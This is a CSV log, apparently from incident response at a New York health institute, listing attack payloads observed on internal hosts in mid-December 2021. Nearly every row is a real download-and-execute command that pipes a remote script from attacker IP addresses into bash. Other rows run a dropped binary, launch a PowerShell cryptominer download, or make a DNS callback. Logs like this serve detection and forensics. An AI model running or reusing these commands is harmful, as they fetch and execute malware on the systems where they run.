host,earliest,payload
dch1746pl5app,12/16/2021 05:09:40,(curl -s 195.54.160.149:5874/34.117.63.247:443||wget -q -O- 195.54.160.149:5874/34.117.63.247:443)|bash
dch1746pl5app,12/16/2021 05:10:10,(curl -s 195.54.160.149:5874/35.190.1.232:443||wget -q -O- 195.54.160.149:5874/35.190.1.232:443)|bash
dch1746pl5app,12/16/2021 05:10:11,(curl -s 195.54.160.149:5874/34.120.140.142:443||wget -q -O- 195.54.160.149:5874/34.120.140.142:443)|bash
dch1746pl5app,12/16/2021 05:10:23,(curl -s 195.54.160.149:5874/34.98.110.253:443||wget -q -O- 195.54.160.149:5874/34.98.110.253:443)|bash
dch1746pl5app,12/16/2021 05:10:38,(curl -s 195.54.160.149:5874/34.117.246.47:443||wget -q -O- 195.54.160.149:5874/34.117.246.47:443)|bash
dch1746pl5app,12/16/2021 05:10:41,(curl -s 195.54.160.149:5874/35.201.66.245:443||wget -q -O- 195.54.160.149:5874/35.201.66.245:443)|bash
dch1746pl5app,12/16/2021 05:10:52,(curl -s 195.54.160.149:5874/34.98.75.221:443||wget -q -O- 195.54.160.149:5874/34.98.75.221:443)|bash
dch1746pl5app,12/16/2021 05:10:56,(curl -s 195.54.160.149:5874/34.107.158.85:443||wget -q -O- 195.54.160.149:5874/34.107.158.85:443)|bash
dch1746pl5app,12/16/2021 05:10:59,(curl -s 195.54.160.149:5874/34.120.120.30:443||wget -q -O- 195.54.160.149:5874/34.120.120.30:443)|bash
dch1746pl5app,12/16/2021 05:11:54,(curl -s 195.54.160.149:5874/34.149.11.4:443||wget -q -O- 195.54.160.149:5874/34.149.11.4:443)|bash
dch1746pl5app,12/16/2021 05:11:56,(curl -s 195.54.160.149:5874/34.117.10.218:443||wget -q -O- 195.54.160.149:5874/34.117.10.218:443)|bash
dch1746pl5app,12/16/2021 05:12:01,(curl -s 195.54.160.149:5874/35.244.237.148:443||wget -q -O- 195.54.160.149:5874/35.244.237.148:443)|bash
dch1746pl5app,12/16/2021 05:12:27,(curl -s 195.54.160.149:5874/34.117.80.251:443||wget -q -O- 195.54.160.149:5874/34.117.80.251:443)|bash
dch1746pl5app,12/16/2021 05:13:21,(curl -s 195.54.160.149:5874/34.107.171.130:443||wget -q -O- 195.54.160.149:5874/34.107.171.130:443)|bash
dch1746pl5app,12/16/2021 05:13:27,(curl -s 195.54.160.149:5874/34.117.200.21:443||wget -q -O- 195.54.160.149:5874/34.117.200.21:443)|bash
dch1746pl5app,12/16/2021 05:13:44,(curl -s 195.54.160.149:5874/34.117.119.33:443||wget -q -O- 195.54.160.149:5874/34.117.119.33:443)|bash
dch1746pl5app,12/16/2021 05:13:47,(curl -s 195.54.160.149:5874/34.102.154.90:443||wget -q -O- 195.54.160.149:5874/34.102.154.90:443)|bash
dch1746pl5app,12/16/2021 05:14:22,(curl -s 195.54.160.149:5874/34.149.141.38:443||wget -q -O- 195.54.160.149:5874/34.149.141.38:443)|bash
dch1746pl5app,12/16/2021 05:14:43,(curl -s 195.54.160.149:5874/34.117.8.187:443||wget -q -O- 195.54.160.149:5874/34.117.8.187:443)|bash
dch1746pl5app,12/16/2021 05:14:56,(curl -s 195.54.160.149:5874/34.120.192.39:443||wget -q -O- 195.54.160.149:5874/34.120.192.39:443)|bash
dch1746pl5app,12/16/2021 05:15:43,(curl -s 195.54.160.149:5874/34.107.132.248:443||wget -q -O- 195.54.160.149:5874/34.107.132.248:443)|bash
dch1746pl5app,12/16/2021 05:15:46,(curl -s 195.54.160.149:5874/34.117.124.66:443||wget -q -O- 195.54.160.149:5874/34.117.124.66:443)|bash
dch1746pl5app,12/16/2021 05:16:28,(curl -s 195.54.160.149:5874/34.102.185.199:443||wget -q -O- 195.54.160.149:5874/34.102.185.199:443)|bash
dch1746pl5app,12/16/2021 05:17:12,(curl -s 195.54.160.149:5874/34.102.168.187:443||wget -q -O- 195.54.160.149:5874/34.102.168.187:443)|bash
dch1746pl5app,12/16/2021 05:18:37,(curl -s 195.54.160.149:5874/35.241.0.112:443||wget -q -O- 195.54.160.149:5874/35.241.0.112:443)|bash
dch1746pl5app,12/16/2021 05:18:38,(curl -s 195.54.160.149:5874/34.102.189.243:443||wget -q -O- 195.54.160.149:5874/34.102.189.243:443)|bash
dch1746pl5app,12/16/2021 05:19:04,(curl -s 195.54.160.149:5874/34.117.138.174:443||wget -q -O- 195.54.160.149:5874/34.117.138.174:443)|bash
dch1746pl5app,12/16/2021 05:19:35,(curl -s 195.54.160.149:5874/34.107.162.241:443||wget -q -O- 195.54.160.149:5874/34.107.162.241:443)|bash
dch1746pl5app,12/16/2021 05:19:45,(curl -s 195.54.160.149:5874/34.117.41.213:443||wget -q -O- 195.54.160.149:5874/34.117.41.213:443)|bash
dch1746pl5app,12/16/2021 05:19:55,(curl -s 195.54.160.149:5874/34.149.59.243:443||wget -q -O- 195.54.160.149:5874/34.149.59.243:443)|bash
dch1746pl5app,12/16/2021 05:20:24,(curl -s 195.54.160.149:5874/34.149.85.31:443||wget -q -O- 195.54.160.149:5874/34.149.85.31:443)|bash
dch1746pl5app,12/16/2021 05:20:29,(curl -s 195.54.160.149:5874/34.117.210.45:443||wget -q -O- 195.54.160.149:5874/34.117.210.45:443)|bash
dch1746pl5app,12/16/2021 05:20:36,(curl -s 195.54.160.149:5874/35.244.147.27:443||wget -q -O- 195.54.160.149:5874/35.244.147.27:443)|bash
dch1746pl5app,12/16/2021 05:20:43,(curl -s 195.54.160.149:5874/34.107.229.112:443||wget -q -O- 195.54.160.149:5874/34.107.229.112:443)|bash
dch1746pl5app,12/16/2021 05:21:29,(curl -s 195.54.160.149:5874/34.120.163.119:443||wget -q -O- 195.54.160.149:5874/34.120.163.119:443)|bash
dch1746pl5app,12/16/2021 05:21:32,(curl -s 195.54.160.149:5874/34.117.200.39:443||wget -q -O- 195.54.160.149:5874/34.117.200.39:443)|bash
dch1746pl5app,12/16/2021 05:21:32,(curl -s 195.54.160.149:5874/34.149.115.200:443||wget -q -O- 195.54.160.149:5874/34.149.115.200:443)|bash
dch1746pl5app,12/16/2021 05:21:41,(curl -s 195.54.160.149:5874/34.117.249.160:443||wget -q -O- 195.54.160.149:5874/34.117.249.160:443)|bash
dch1746pl5app,12/16/2021 05:22:30,(curl -s 195.54.160.149:5874/35.190.69.251:443||wget -q -O- 195.54.160.149:5874/35.190.69.251:443)|bash
dch1746pl5app,12/16/2021 05:23:33,(curl -s 195.54.160.149:5874/34.117.232.66:443||wget -q -O- 195.54.160.149:5874/34.117.232.66:443)|bash
dch1746pl5app,12/16/2021 05:23:56,(curl -s 195.54.160.149:5874/34.117.138.247:443||wget -q -O- 195.54.160.149:5874/34.117.138.247:443)|bash
dch1746pl5app,12/16/2021 05:24:59,(curl -s 195.54.160.149:5874/34.120.89.28:443||wget -q -O- 195.54.160.149:5874/34.120.89.28:443)|bash
dch1746pl5app,12/16/2021 05:25:27,(curl -s 195.54.160.149:5874/34.149.100.92:443||wget -q -O- 195.54.160.149:5874/34.149.100.92:443)|bash
dch1746pl5app,12/16/2021 05:25:37,(curl -s 195.54.160.149:5874/34.117.59.122:443||wget -q -O- 195.54.160.149:5874/34.117.59.122:443)|bash
dch1746pl5app,12/16/2021 05:26:40,(curl -s 195.54.160.149:5874/34.117.245.197:443||wget -q -O- 195.54.160.149:5874/34.117.245.197:443)|bash
dch1746pl5app,12/16/2021 06:33:48,curl -k https://41.157.42.239/bk.sh | bash
dch1746pl5app,12/16/2021 09:42:05,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bash
dch1746pl5app,12/16/2021 14:32:09,(curl -s 195.54.160.149:5874/34.117.238.254:80||wget -q -O- 195.54.160.149:5874/34.117.238.254:80)|bash
dch1746pl5app,12/16/2021 14:37:48,(curl -s 195.54.160.149:5874/34.102.182.99:80||wget -q -O- 195.54.160.149:5874/34.102.182.99:80)|bash
dch1746pl5app,12/16/2021 15:00:57,(curl -s 195.54.160.149:5874/34.117.19.113:80||wget -q -O- 195.54.160.149:5874/34.117.19.113:80)|bash
dch1746pl5app,12/16/2021 18:12:27,cd /tmp;wget http://155.94.154.170/bbb;curl -O http://155.94.154.170/bbb;chmod +x bbb;./bbb
dch1746pl5app,12/17/2021 01:32:15,(curl -s 195.54.160.149:5874/35.201.64.131:443||wget -q -O- 195.54.160.149:5874/35.201.64.131:443)|bash
dch1746pl5app,12/17/2021 01:33:30,(curl -s 195.54.160.149:5874/34.120.72.56:443||wget -q -O- 195.54.160.149:5874/34.120.72.56:443)|bash
dch1746pl5app,12/17/2021 01:34:23,(curl -s 195.54.160.149:5874/35.244.239.250:443||wget -q -O- 195.54.160.149:5874/35.244.239.250:443)|bash
dch1746pl5app,12/17/2021 01:35:01,(curl -s 195.54.160.149:5874/34.98.88.107:443||wget -q -O- 195.54.160.149:5874/34.98.88.107:443)|bash
dch1746pl5app,12/17/2021 01:39:37,(curl -s 195.54.160.149:5874/34.95.67.229:443||wget -q -O- 195.54.160.149:5874/34.95.67.229:443)|bash
dch1746pl5app,12/17/2021 01:40:14,(curl -s 195.54.160.149:5874/34.102.182.99:443||wget -q -O- 195.54.160.149:5874/34.102.182.99:443)|bash
dch1746pl5app,12/17/2021 01:41:00,(curl -s 195.54.160.149:5874/34.117.162.9:443||wget -q -O- 195.54.160.149:5874/34.117.162.9:443)|bash
dch1746pl5app,12/17/2021 01:41:28,(curl -s 195.54.160.149:5874/34.95.126.171:443||wget -q -O- 195.54.160.149:5874/34.95.126.171:443)|bash
dch1746pl5app,12/17/2021 01:43:05,(curl -s 195.54.160.149:5874/34.117.48.251:443||wget -q -O- 195.54.160.149:5874/34.117.48.251:443)|bash
dch1746pl5app,12/17/2021 01:44:15,(curl -s 195.54.160.149:5874/34.120.176.97:443||wget -q -O- 195.54.160.149:5874/34.120.176.97:443)|bash
dch1746pl5app,12/17/2021 01:47:07,(curl -s 195.54.160.149:5874/34.117.19.113:443||wget -q -O- 195.54.160.149:5874/34.117.19.113:443)|bash
dch1746pl5app,12/17/2021 01:51:03,(curl -s 195.54.160.149:5874/34.117.37.153:443||wget -q -O- 195.54.160.149:5874/34.117.37.153:443)|bash
dch1746pl5app,12/17/2021 01:56:34,(curl -s 195.54.160.149:5874/34.117.62.54:443||wget -q -O- 195.54.160.149:5874/34.117.62.54:443)|bash
dch1746pl5app,12/17/2021 01:57:08,(curl -s 195.54.160.149:5874/35.241.56.154:443||wget -q -O- 195.54.160.149:5874/35.241.56.154:443)|bash
dch1746pl5app,12/17/2021 02:00:04,(curl -s 195.54.160.149:5874/35.201.116.103:443||wget -q -O- 195.54.160.149:5874/35.201.116.103:443)|bash
dch1746pl5app,12/17/2021 02:01:16,(curl -s 195.54.160.149:5874/34.117.45.5:443||wget -q -O- 195.54.160.149:5874/34.117.45.5:443)|bash
dch1746pl5app,12/17/2021 02:03:18,(curl -s 195.54.160.149:5874/35.201.123.203:443||wget -q -O- 195.54.160.149:5874/35.201.123.203:443)|bash
dch1746pl5app,12/17/2021 02:04:44,(curl -s 195.54.160.149:5874/34.96.113.220:443||wget -q -O- 195.54.160.149:5874/34.96.113.220:443)|bash
dch1746pl5app,12/17/2021 02:04:49,(curl -s 195.54.160.149:5874/35.244.231.17:443||wget -q -O- 195.54.160.149:5874/35.244.231.17:443)|bash
dch1746pl5app,12/17/2021 02:05:56,(curl -s 195.54.160.149:5874/34.149.10.162:443||wget -q -O- 195.54.160.149:5874/34.149.10.162:443)|bash
dch1746pl5app,12/17/2021 02:08:08,(curl -s 195.54.160.149:5874/34.117.154.216:443||wget -q -O- 195.54.160.149:5874/34.117.154.216:443)|bash
dch1746pl5app,12/17/2021 02:08:54,(curl -s 195.54.160.149:5874/130.211.23.104:443||wget -q -O- 195.54.160.149:5874/130.211.23.104:443)|bash
dch1746pl5app,12/17/2021 02:10:31,(curl -s 195.54.160.149:5874/35.227.230.102:443||wget -q -O- 195.54.160.149:5874/35.227.230.102:443)|bash
dch1746pl5app,12/17/2021 02:12:13,(curl -s 195.54.160.149:5874/35.241.62.128:443||wget -q -O- 195.54.160.149:5874/35.241.62.128:443)|bash
dch1746pl5app,12/17/2021 02:13:32,(curl -s 195.54.160.149:5874/34.117.245.42:443||wget -q -O- 195.54.160.149:5874/34.117.245.42:443)|bash
dch1746pl5app,12/17/2021 02:15:48,(curl -s 195.54.160.149:5874/34.117.232.23:443||wget -q -O- 195.54.160.149:5874/34.117.232.23:443)|bash
dch1746pl5app,12/17/2021 02:16:05,(curl -s 195.54.160.149:5874/34.107.206.62:443||wget -q -O- 195.54.160.149:5874/34.107.206.62:443)|bash
dch1746pl5app,12/17/2021 02:17:00,(curl -s 195.54.160.149:5874/35.241.25.147:443||wget -q -O- 195.54.160.149:5874/35.241.25.147:443)|bash
dch1746pl5app,12/17/2021 22:05:03,(curl -s 195.54.160.149:5874/35.227.227.94:443||wget -q -O- 195.54.160.149:5874/35.227.227.94:443)|bash
dch1746pl5app,12/17/2021 22:08:48,(curl -s 195.54.160.149:5874/130.211.13.64:443||wget -q -O- 195.54.160.149:5874/130.211.13.64:443)|bash
dch1746pl5app,12/17/2021 22:12:45,(curl -s 195.54.160.149:5874/34.149.115.105:443||wget -q -O- 195.54.160.149:5874/34.149.115.105:443)|bash
dch1746pl5app,12/17/2021 22:13:37,(curl -s 195.54.160.149:5874/34.149.126.62:443||wget -q -O- 195.54.160.149:5874/34.149.126.62:443)|bash
dch1746pl5app,12/17/2021 22:14:29,(curl -s 195.54.160.149:5874/34.117.150.208:443||wget -q -O- 195.54.160.149:5874/34.117.150.208:443)|bash
dch1746pl5app,12/17/2021 22:24:18,(curl -s 195.54.160.149:5874/34.102.201.36:443||wget -q -O- 195.54.160.149:5874/34.102.201.36:443)|bash
dch1746pl5app,12/17/2021 22:28:03,(curl -s 195.54.160.149:5874/34.149.133.74:443||wget -q -O- 195.54.160.149:5874/34.149.133.74:443)|bash
dch1746pl5app,12/17/2021 22:44:06,(curl -s 195.54.160.149:5874/34.117.51.246:443||wget -q -O- 195.54.160.149:5874/34.117.51.246:443)|bash
dch1746pl5app,12/17/2021 22:44:39,(curl -s 195.54.160.149:5874/34.102.150.184:443||wget -q -O- 195.54.160.149:5874/34.102.150.184:443)|bash
dch1746pl5app,12/18/2021 07:42:41,(curl -s 195.54.160.149:5874/34.120.171.253:80||wget -q -O- 195.54.160.149:5874/34.120.171.253:80)|bash
dch1746pl5app,12/18/2021 07:53:33,(curl -s 195.54.160.149:5874/34.149.126.62:80||wget -q -O- 195.54.160.149:5874/34.149.126.62:80)|bash
dch1746pl5app,12/18/2021 08:14:54,(curl -s 195.54.160.149:5874/34.149.115.105:80||wget -q -O- 195.54.160.149:5874/34.149.115.105:80)|bash
dch1746pl5app,12/18/2021 18:30:41,(curl -s 195.54.160.149:5874/34.117.231.29:443||wget -q -O- 195.54.160.149:5874/34.117.231.29:443)|bash
dch1746pl5app,12/18/2021 18:40:42,(curl -s 195.54.160.149:5874/34.120.255.218:443||wget -q -O- 195.54.160.149:5874/34.120.255.218:443)|bash
dch1746pl5app,12/19/2021 15:03:20,(curl -s 195.54.160.149:5874/34.120.171.253:443||wget -q -O- 195.54.160.149:5874/34.120.171.253:443)|bash
dch1746pl5app,12/21/2021 16:51:48,(curl -s 195.54.160.149:5874/34.117.138.247:80||wget -q -O- 195.54.160.149:5874/34.117.138.247:80)|bash
dch1746pl5app,12/23/2021 11:10:30,(curl -s http://91.200.103.249:8080/multi/wget.sh||wget -O- -q http://91.200.103.249:8080/multi/wget.sh)|sh
drupal.nyspi.local,12/15/2021 17:47:18,wget http://152.67.63.150/py; curl -O http://152.67.63.150/py; chmod 777 py; ./py rce.x86
drupal.nyspi.local,12/15/2021 23:39:13,(curl -s 195.54.160.149:5874/156.111.139.143:443||wget -q -O- 195.54.160.149:5874/156.111.139.143:443)|bash
drupal.nyspi.local,12/15/2021 23:40:35,(curl -s 195.54.160.149:5874/156.111.139.192:443||wget -q -O- 195.54.160.149:5874/156.111.139.192:443)|bash
drupal.nyspi.local,12/15/2021 23:59:31,(curl -s 195.54.160.149:5874/156.111.139.87:443||wget -q -O- 195.54.160.149:5874/156.111.139.87:443)|bash
drupal.nyspi.local,12/16/2021 00:04:51,(curl -s 195.54.160.149:5874/156.111.139.221:443||wget -q -O- 195.54.160.149:5874/156.111.139.221:443)|bash
drupal.nyspi.local,12/16/2021 00:16:07,(curl -s 195.54.160.149:5874/156.111.139.189:443||wget -q -O- 195.54.160.149:5874/156.111.139.189:443)|bash
drupal.nyspi.local,12/22/2021 19:23:52,(curl -s 195.54.160.149:5874/156.111.139.58:443||wget -q -O- 195.54.160.149:5874/156.111.139.58:443)|bash
drupal.nyspi.local,12/23/2021 01:00:41,ping aaf63cff.dns.bypass.eu.org
drupal.nyspi.local,12/23/2021 04:20:42,(curl -s 195.54.160.149:5874/156.111.139.87:80||wget -q -O- 195.54.160.149:5874/156.111.139.87:80)|bash
drupal.nyspi.local,12/23/2021 04:43:39,(curl -s 195.54.160.149:5874/156.111.139.58:80||wget -q -O- 195.54.160.149:5874/156.111.139.58:80)|bash
drupal.nyspi.local,12/23/2021 04:45:47,(curl -s 195.54.160.149:5874/156.111.139.221:80||wget -q -O- 195.54.160.149:5874/156.111.139.221:80)|bash
ent1987pw5vcs,12/15/2021 23:39:44,(curl -s 195.54.160.149:5874/161.11.223.199:443||wget -q -O- 195.54.160.149:5874/161.11.223.199:443)|bash
ent1989pw5vcs,12/15/2021 23:39:44,(curl -s 195.54.160.149:5874/161.11.223.199:443||wget -q -O- 195.54.160.149:5874/161.11.223.199:443)|bash
ent1990pw5vcs,12/15/2021 23:39:44,(curl -s 195.54.160.149:5874/161.11.223.199:443||wget -q -O- 195.54.160.149:5874/161.11.223.199:443)|bash
ent2030pw5vcs,12/16/2021 00:15:23,(curl -s 195.54.160.149:5874/161.11.141.145:443||wget -q -O- 195.54.160.149:5874/161.11.141.145:443)|bash
ent2031pw5vcs,12/16/2021 00:15:23,(curl -s 195.54.160.149:5874/161.11.141.145:443||wget -q -O- 195.54.160.149:5874/161.11.141.145:443)|bash
ent2034pw5vcs,12/16/2021 00:15:23,(curl -s 195.54.160.149:5874/161.11.141.145:443||wget -q -O- 195.54.160.149:5874/161.11.141.145:443)|bash
ent2170pw5vcs,12/16/2021 00:25:11,(curl -s 195.54.160.149:5874/161.11.225.12:443||wget -q -O- 195.54.160.149:5874/161.11.225.12:443)|bash
ent2174pw5vcs,12/16/2021 00:25:11,(curl -s 195.54.160.149:5874/161.11.225.12:443||wget -q -O- 195.54.160.149:5874/161.11.225.12:443)|bash
ent2211pw5vcs,12/16/2021 00:25:11,(curl -s 195.54.160.149:5874/161.11.225.12:443||wget -q -O- 195.54.160.149:5874/161.11.225.12:443)|bash
ent2212pw5vcs,12/16/2021 00:25:11,(curl -s 195.54.160.149:5874/161.11.225.12:443||wget -q -O- 195.54.160.149:5874/161.11.225.12:443)|bash
ent2250pw5vcs,12/16/2021 00:25:11,(curl -s 195.54.160.149:5874/161.11.225.12:443||wget -q -O- 195.54.160.149:5874/161.11.225.12:443)|bash
ent2252pw5vcs,12/16/2021 00:25:11,(curl -s 195.54.160.149:5874/161.11.225.12:443||wget -q -O- 195.54.160.149:5874/161.11.225.12:443)|bash
ent2553pw5vcs,12/16/2021 21:04:06,(curl -s 195.54.160.149:5874/161.11.142.79:443||wget -q -O- 195.54.160.149:5874/161.11.142.79:443)|bash
ent2554pw5vcs,12/16/2021 21:04:06,(curl -s 195.54.160.149:5874/161.11.142.79:443||wget -q -O- 195.54.160.149:5874/161.11.142.79:443)|bash
ent2555pw5vcs,12/16/2021 21:04:06,(curl -s 195.54.160.149:5874/161.11.142.79:443||wget -q -O- 195.54.160.149:5874/161.11.142.79:443)|bash
ent2556pw5vcs,12/16/2021 21:04:06,(curl -s 195.54.160.149:5874/161.11.142.79:443||wget -q -O- 195.54.160.149:5874/161.11.142.79:443)|bash
ent2558pw5vcs,12/16/2021 21:04:06,(curl -s 195.54.160.149:5874/161.11.142.79:443||wget -q -O- 195.54.160.149:5874/161.11.142.79:443)|bash
ent860pw5vcs,12/16/2021 20:57:28,(curl -s 195.54.160.149:5874/161.11.222.30:443||wget -q -O- 195.54.160.149:5874/161.11.222.30:443)|bash
ent861pw5vcs,12/16/2021 20:57:28,(curl -s 195.54.160.149:5874/161.11.222.30:443||wget -q -O- 195.54.160.149:5874/161.11.222.30:443)|bash
nyspi_internalsites.nyspi.local,12/14/2021 16:31:11,(curl -s 195.54.160.149:5874/52.0.114.248:80||wget -q -O- 195.54.160.149:5874/52.0.114.248:80)|bash
nyspi_internalsites.nyspi.local,12/14/2021 17:03:07,(curl -s 195.54.160.149:5874/35.153.151.76:80||wget -q -O- 195.54.160.149:5874/35.153.151.76:80)|bash
nyspi_internalsites.nyspi.local,12/16/2021 00:01:50,(curl -s 195.54.160.149:5874/156.111.139.10:443||wget -q -O- 195.54.160.149:5874/156.111.139.10:443)|bash
nyspi_internalsites.nyspi.local,12/22/2021 18:54:05,(curl -s 195.54.160.149:5874/156.111.139.193:443||wget -q -O- 195.54.160.149:5874/156.111.139.193:443)|bash
sds0299ql5web,12/15/2021 12:53:40,(curl -s 195.54.160.149:5874/161.11.222.168:80||wget -q -O- 195.54.160.149:5874/161.11.222.168:80)|bash
sds0299ql5web,12/16/2021 21:02:43,(curl -s 195.54.160.149:5874/161.11.222.168:443||wget -q -O- 195.54.160.149:5874/161.11.222.168:443)|bash
sds0300ql5web,12/15/2021 12:53:40,(curl -s 195.54.160.149:5874/161.11.222.168:80||wget -q -O- 195.54.160.149:5874/161.11.222.168:80)|bash
sds0300ql5web,12/16/2021 21:02:43,(curl -s 195.54.160.149:5874/161.11.222.168:443||wget -q -O- 195.54.160.149:5874/161.11.222.168:443)|bash
squid04.health.state.ny.us,12/14/2021 16:29:47,(curl -s 195.54.160.149:5874/150.142.196.76:80||wget -q -O- 195.54.160.149:5874/150.142.196.76:80)|bash
squid04.health.state.ny.us,12/14/2021 16:31:39,(curl -s 195.54.160.149:5874/150.142.196.38:80||wget -q -O- 195.54.160.149:5874/150.142.196.38:80)|bash
squid04.health.state.ny.us,12/14/2021 16:31:50,(curl -s 195.54.160.149:5874/150.142.196.3:80||wget -q -O- 195.54.160.149:5874/150.142.196.3:80)|bash
squid04.health.state.ny.us,12/14/2021 16:38:24,(curl -s 195.54.160.149:5874/150.142.196.37:80||wget -q -O- 195.54.160.149:5874/150.142.196.37:80)|bash
squid04.health.state.ny.us,12/14/2021 16:43:43,(curl -s 195.54.160.149:5874/150.142.196.75:80||wget -q -O- 195.54.160.149:5874/150.142.196.75:80)|bash
squid04.health.state.ny.us,12/14/2021 16:51:45,(curl -s 195.54.160.149:5874/150.142.196.12:80||wget -q -O- 195.54.160.149:5874/150.142.196.12:80)|bash
squid04.health.state.ny.us,12/14/2021 16:54:34,(curl -s 195.54.160.149:5874/150.142.196.45:80||wget -q -O- 195.54.160.149:5874/150.142.196.45:80)|bash
squid04.health.state.ny.us,12/14/2021 16:57:38,(curl -s 195.54.160.149:5874/150.142.196.42:80||wget -q -O- 195.54.160.149:5874/150.142.196.42:80)|bash
squid04.health.state.ny.us,12/15/2021 12:56:08,(curl -s 195.54.160.149:5874/150.142.196.35:80||wget -q -O- 195.54.160.149:5874/150.142.196.35:80)|bash
squid04.health.state.ny.us,12/15/2021 13:13:13,(curl -s 195.54.160.149:5874/150.142.196.49:80||wget -q -O- 195.54.160.149:5874/150.142.196.49:80)|bash
squid04.health.state.ny.us,12/15/2021 13:26:45,(curl -s 195.54.160.149:5874/150.142.196.16:80||wget -q -O- 195.54.160.149:5874/150.142.196.16:80)|bash
squid04.health.state.ny.us,12/15/2021 13:27:39,(curl -s 195.54.160.149:5874/150.142.196.14:80||wget -q -O- 195.54.160.149:5874/150.142.196.14:80)|bash
squid04.health.state.ny.us,12/15/2021 17:47:18,wget http://152.67.63.150/py; curl -O http://152.67.63.150/py; chmod 777 py; ./py rce.x86
squid04.health.state.ny.us,12/16/2021 09:33:00,(curl -s 195.54.160.149:5874/150.142.196.44:80||wget -q -O- 195.54.160.149:5874/150.142.196.44:80)|bash
squid04.health.state.ny.us,12/19/2021 19:26:47,"powershell -Command ""$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://lurchmath.org/wordpress-temp/wp-content/plugins/mine.bat', $tempfile); & $tempfile 42JKzDhbU76Wbf7JSDhomw6utwLr3N8tjZXLzLwvTcPuP5ZGZiJAHwnD7dNf2ZSAh52i9cUefq2nmLK3azKBffkBMX5b1LY; Remove-Item -Force $tempfile"""
squid04.health.state.ny.us,12/23/2021 11:10:30,(curl -s http://91.200.103.249:8080/multi/wget.sh||wget -O- -q http://91.200.103.249:8080/multi/wget.sh)|sh
squid05,12/14/2021 16:26:45,(curl -s 195.54.160.149:5874/199.184.22.36:80||wget -q -O- 195.54.160.149:5874/199.184.22.36:80)|bash
squid05,12/14/2021 16:27:01,(curl -s 195.54.160.149:5874/199.184.17.17:80||wget -q -O- 195.54.160.149:5874/199.184.17.17:80)|bash
squid05,12/14/2021 16:30:40,(curl -s 195.54.160.149:5874/199.184.22.35:80||wget -q -O- 195.54.160.149:5874/199.184.22.35:80)|bash
squid05,12/14/2021 16:32:10,(curl -s 195.54.160.149:5874/199.184.28.232:80||wget -q -O- 195.54.160.149:5874/199.184.28.232:80)|bash
squid05,12/14/2021 16:38:21,(curl -s 195.54.160.149:5874/199.184.28.130:80||wget -q -O- 195.54.160.149:5874/199.184.28.130:80)|bash
squid05,12/14/2021 16:38:57,(curl -s 195.54.160.149:5874/199.184.28.130:8080||wget -q -O- 195.54.160.149:5874/199.184.28.130:8080)|bash
squid05,12/14/2021 16:40:20,(curl -s 195.54.160.149:5874/199.184.28.31:80||wget -q -O- 195.54.160.149:5874/199.184.28.31:80)|bash
squid05,12/14/2021 16:46:53,(curl -s 195.54.160.149:5874/199.184.28.182:80||wget -q -O- 195.54.160.149:5874/199.184.28.182:80)|bash
squid05,12/14/2021 16:49:00,(curl -s 195.54.160.149:5874/199.184.28.2:80||wget -q -O- 195.54.160.149:5874/199.184.28.2:80)|bash
squid05,12/14/2021 16:53:01,(curl -s 195.54.160.149:5874/199.184.17.19:80||wget -q -O- 195.54.160.149:5874/199.184.17.19:80)|bash
squid05,12/14/2021 16:54:06,(curl -s 195.54.160.149:5874/199.184.22.14:80||wget -q -O- 195.54.160.149:5874/199.184.22.14:80)|bash
squid05,12/14/2021 16:56:17,(curl -s 195.54.160.149:5874/199.184.28.236:80||wget -q -O- 195.54.160.149:5874/199.184.28.236:80)|bash
squid05,12/14/2021 16:57:19,(curl -s 195.54.160.149:5874/199.184.17.18:80||wget -q -O- 195.54.160.149:5874/199.184.17.18:80)|bash
squid05,12/15/2021 12:54:53,(curl -s 195.54.160.149:5874/199.184.28.235:80||wget -q -O- 195.54.160.149:5874/199.184.28.235:80)|bash
squid05,12/15/2021 17:47:18,wget http://152.67.63.150/py; curl -O http://152.67.63.150/py; chmod 777 py; ./py rce.x86
squid05,12/16/2021 09:57:54,(curl -s 195.54.160.149:5874/199.184.28.131:8080||wget -q -O- 195.54.160.149:5874/199.184.28.131:8080)|bash
syslogsrv1,12/14/2021 16:43:30,(curl -s 195.54.160.149:5874/34.199.170.244:80||wget -q -O- 195.54.160.149:5874/34.199.170.244:80)|bash
syslogsrv1,12/15/2021 13:27:39,(curl -s 195.54.160.149:5874/150.142.196.14:80||wget -q -O- 195.54.160.149:5874/150.142.196.14:80)|bash
syslogsrv1,12/15/2021 23:43:34,(curl -s 195.54.160.149:5874/150.142.196.4:443||wget -q -O- 195.54.160.149:5874/150.142.196.4:443)|bash
